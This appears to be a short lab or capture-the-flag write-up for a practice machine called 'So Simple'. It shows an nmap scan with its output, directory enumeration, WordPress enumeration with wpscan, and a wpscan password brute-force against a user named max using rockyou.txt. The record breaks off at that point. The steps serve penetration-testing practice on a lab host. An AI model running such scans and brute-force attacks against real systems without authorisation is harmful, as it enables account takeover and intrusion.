???(kali?kali)-[~]
??$ nmap $ip -sC -sV -p- -oA initial
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-12 05:56 +0000
Nmap scan report for 192.168.56.78
Host is up (0.00035s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5b:55:43:ef:af:d0:3d:0e:63:20:7a:f4:ac:41:6a:45 (RSA)
|   256 53:f5:23:1b:e9:aa:8f:41:e2:18:c6:05:50:07:d8:d4 (ECDSA)
|_  256 55:b7:7b:7e:0b:f5:4d:1b:df:c3:5d:a1:d7:68:a9:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: So Simple
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.05 seconds

gobuster
<img width="874" height="503" alt="image" src="https://github.com/user-attachments/assets/7792411b-14a1-43c4-9e8a-428a0b267f52" />
<img width="1438" height="760" alt="image" src="https://github.com/user-attachments/assets/0d435085-8728-466c-ba83-f7f370433df5" />

wp-content           (Status: 301) [Size: 329] [--> http://192.168.56.78/wordpress/wp-content/]
wp-includes          (Status: 301) [Size: 330] [--> http://192.168.56.78/wordpress/wp-includes/]
wp-admin             (Status: 301) [Size: 327] [--> http://192.168.56.78/wordpress/wp-admin/]

wpscan --url "http://192.168.56.78/wordpress" --enumerate
<img width="775" height="392" alt="image" src="https://github.com/user-attachments/assets/d7b15e06-1abd-4140-93a9-01e94e06caea" />

wpscan got us to wp-content/uploads. and seeing the name max here, we can use it to bruteforce.

wpscan --url "http://192.168.56.78/word[ress" -U max -P rockyou.txt
<img width="347" height="48" alt="image" src="https://github.com/user-attachments/assets/5cfacc78-f3c9-4713-95f2-96b93941dc45" />

